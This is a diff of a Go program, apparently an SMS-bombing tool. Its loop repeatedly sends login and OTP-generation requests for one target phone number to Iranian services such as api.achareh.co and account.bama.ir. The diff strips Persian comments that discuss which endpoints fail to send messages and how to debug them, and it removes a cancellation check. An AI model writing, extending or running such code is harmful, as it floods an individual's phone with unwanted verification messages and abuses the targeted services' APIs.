@@ -237,23 +237,10 @@ func main() {
 			}
 		}()
 	}
-// حلقه اصلی برای تعریف و ارسال کارها به کانال tasks
+
 	for i := 0; i < repeatCount; i++ {
-		// بررسی لغو Context قبل از ارسال هر بلوک از وظایف
-		select {
-		case <-ctx.Done():
-			fmt.Println("\033[01;33m[!] Task dispatching canceled.\033[0m")
-			goto endOfDispatch // پرش به انتهای حلقه
-		default:
-			// ادامه ارسال وظایف
-		}
-
-		// ---- API هایی که پیام ارسال نکردند (نیاز به بررسی بیشتر) ----
-
-		// 1. api.achareh.co (JSON) - گزارش شده کار نکرده. Payload ساده است.
-		// احتمالات: نیاز به هدرهای خاص (مثل User-Agent, Origin)، یا اعتبارسنجی سمت سرور بر اساس IP یا شماره.
-		// برای عیب یابی: جزئیات درخواست در مرورگر (تب Network) را بررسی کنید.
-		wg.Add(1)
+		
+        wg.Add(1)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://api.achareh.co/v2/accounts/login/?web=true", map[string]interface{}{
 				"phone": phone,
@@ -352,11 +339,11 @@ func main() {
 			sendFormRequest(ctx, "https://account.bama.ir/api/otp/generate/v4", formData, &wg, ch)
 		}
 
-		// ... (API هایی که قبلاً کار می کردند و می خواهید اضافه کنید) ...
 
-	} // پایان حلقه repeatCount
+	}
 
-close(tasks)
+	
+	close(tasks)
 
 
 	go func() {
